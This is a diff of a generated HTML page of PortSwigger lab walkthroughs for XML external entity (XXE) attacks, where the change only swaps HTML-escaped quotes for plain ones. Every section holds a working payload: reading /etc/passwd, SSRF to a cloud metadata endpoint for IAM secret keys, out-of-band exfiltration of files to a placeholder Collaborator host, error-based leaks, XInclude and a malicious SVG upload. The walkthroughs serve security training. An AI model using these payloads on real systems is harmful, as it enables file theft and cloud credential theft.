@@ -27494,11 +27494,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-6">6</a></span>
 <span class="normal"><a href="#__codelineno-0-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a># Burpsuite solution
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>1. Visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 </span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;`
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain &quot;Invalid product ID:&quot; followed by the contents of the `/etc/passwd` file.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;`
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.
 </span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</h2>
 <h3 id="enunciation_1">Enunciation</h3>
@@ -27522,11 +27522,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-1-5">5</a></span>
 <span class="normal"><a href="#__codelineno-1-6">6</a></span>
 <span class="normal"><a href="#__codelineno-1-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a># Burpsuite solution
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>1. Visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/&quot;&gt; ]&gt;`
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain &quot;Invalid product ID:&quot; followed by the response from the metadata endpoint, which will initially be a folder name.
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt; ]&gt;`
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
 </span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.
 </span></code></pre></div></td></tr></table></div>
 <h2 id="blind-xxe-with-out-of-band-interaction">Blind XXE with out-of-band interaction</h2>
@@ -27546,14 +27546,14 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-2-7">7</a></span>
 <span class="normal"><a href="#__codelineno-2-8">8</a></span>
 <span class="normal"><a href="#__codelineno-2-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a># Burpsuite solution
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>1. Visit a product page, click &quot;Check stock&quot; and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select &quot;Insert Collaborator payload&quot; to insert a Burp Collaborator subdomain where indicated:
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>    `&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; ]&gt;`
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>    `&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; ]&gt;`
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>3. Replace the `productId` number with a reference to the external entity:
 </span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>
 </span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>    `&amp;xxe;`
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>4. Go to the Collaborator tab, and click &quot;Poll now&quot;. If you don&#39;t see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
 </span></code></pre></div></td></tr></table></div>
 <h2 id="blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">Blind XXE with out-of-band interaction via XML parameter entities</h2>
 <h3 id="enunciation_3">Enunciation</h3>
@@ -27567,11 +27567,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-3-2">2</a></span>
 <span class="normal"><a href="#__codelineno-3-3">3</a></span>
 <span class="normal"><a href="#__codelineno-3-4">4</a></span>
-<span class="normal"><a href="#__codelineno-3-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>1. Visit a product page, click &quot;Check stock&quot; and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select &quot;Insert Collaborator payload&quot; to insert a Burp Collaborator subdomain where indicated:
+<span class="normal"><a href="#__codelineno-3-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>    `&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; %xxe; ]&gt;`
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>3. Go to the Collaborator tab, and click &quot;Poll now&quot;. If you don&#39;t see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>    `&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; %xxe; ]&gt;`
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
 </span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">Exploiting blind XXE to exfiltrate data using a malicious external DTD</h2>
 <h3 id="enunciation_4">Enunciation</h3>
@@ -27594,16 +27594,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-4-12">12</a></span>
 <span class="normal"><a href="#__codelineno-4-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a># Burpsuite solution
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>2. Click &quot;Copy to clipboard&quot; to copy a unique Burp Collaborator payload to your clipboard.
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 </span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>3. Place the Burp Collaborator payload into a malicious DTD file:
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>    `&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&#39;&gt;&quot;&gt; %eval; %exfil;`
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>4. Click &quot;Go to exploit server&quot; and save the malicious DTD file on your server. Click &quot;View exploit&quot; and take a note of the URL.
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>    `&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt; &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;"&gt; %eval; %exfil;`
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 </span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;`
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>7. Go back to the Collaborator tab, and click &quot;Poll now&quot;. If you don&#39;t see any interactions listed, wait a few seconds and try again.
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;`
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
 </span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.
 </span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-blind-xxe-to-retrieve-data-via-error-messages">Exploiting blind XXE to retrieve data via error messages</h2>
@@ -27629,17 +27629,17 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-5-14">14</a></span>
 <span class="normal"><a href="#__codelineno-5-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a># Burpsuite solution
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>1. Click &quot;Go to exploit server&quot; and save the following malicious DTD file on your server:
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>1. Click "Go to exploit server" and save the following malicious DTD file on your server:
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>    `&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;&quot;&gt; %eval; %exfil;`
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>    `&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt; &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt; %eval; %exfil;`
 </span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>    When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.
 </span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>2. Click &quot;View exploit&quot; and take a note of the URL for your malicious DTD.
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>2. Click "View exploit" and take a note of the URL for your malicious DTD.
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>4. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 </span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;`
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;`
 </span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>
 </span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>    You should see an error message containing the contents of the `/etc/passwd` file.
 </span></code></pre></div></td></tr></table></div>
@@ -27658,10 +27658,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-6-5">5</a></span>
 <span class="normal"><a href="#__codelineno-6-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a># Burpsuite solution
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>1. Visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>2. Set the value of the `productId` parameter to:
 </span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>    `&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;`
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>    `&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;`
 </span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-xxe-via-image-file-upload">Exploiting XXE via image file upload</h2>
 <h3 id="enunciation_7">Enunciation</h3>
@@ -27681,12 +27681,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>- reate a local SVG image with the following content:
 </span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>    `&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;`
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>    `&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;`
 </span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>- Post a comment on a blog post, and upload this image as an avatar.
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>- When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the &quot;Submit solution&quot; button to submit the value of the server hostname.
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>- When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.
 </span></code></pre></div></td></tr></table></div>
 <p>Payload:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
 </span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd">Exploiting XXE to retrieve data by repurposing a local DTD</h2>
 <h3 id="enunciation_8">Enunciation</h3>
@@ -27704,10 +27704,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-9-5">5</a></span>
 <span class="normal"><a href="#__codelineno-9-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a># Burpsuite solution
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>1. Visit a product page, click &quot;Check stock&quot;, and intercept the resulting POST request in Burp Suite.
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
 </span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>    `&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd; ]&gt;` This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>    `&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt; &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd; ]&gt;` This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
